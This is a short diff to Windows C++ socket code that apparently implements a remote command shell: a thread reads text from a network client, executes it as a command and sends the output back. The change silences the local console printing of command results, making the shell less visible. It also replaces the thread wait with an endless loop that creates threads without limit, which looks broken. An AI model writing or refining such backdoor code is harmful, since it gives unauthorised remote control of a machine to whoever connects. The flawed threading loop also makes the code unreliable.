@@ -36,9 +36,9 @@ DWORD WINAPI cmd(LPVOID Socket) {
         iRecv = recv(clientSock, input, BUFSIZ, 0);
         string buff = exec(input);
         buffer = (char*)buff.c_str();
-        cout << buffer << endl;
+        //cout << buffer << endl;
         byteRead = buff.length();
-        cout << byteRead << endl;
+        //cout << byteRead << endl;
         //send output size
         int iSend = send(clientSock, (char*)&byteRead, sizeof(byteRead), 0);
         //send output
@@ -132,8 +132,11 @@ int main()
     }
     DWORD serveThread;
     HANDLE hServeThread;
-    hServeThread = CreateThread(NULL, 0, serve, (LPVOID)serverSocket, 0, &serveThread);
-    WaitForSingleObject(hServeThread, INFINITE);
+    while (1) {
+        hServeThread = CreateThread(NULL, 0, serve, (LPVOID)serverSocket, 0, &serveThread);
+    }
+    
+  
     
    
 }
